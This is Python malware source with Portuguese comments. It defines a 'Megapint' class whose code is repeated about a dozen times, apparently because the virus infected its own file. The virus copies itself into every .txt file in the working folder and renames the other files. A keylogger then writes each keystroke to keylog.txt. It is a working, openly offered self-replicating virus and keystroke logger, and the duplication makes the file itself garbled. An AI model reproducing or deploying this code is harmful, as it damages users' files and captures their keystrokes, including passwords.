    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
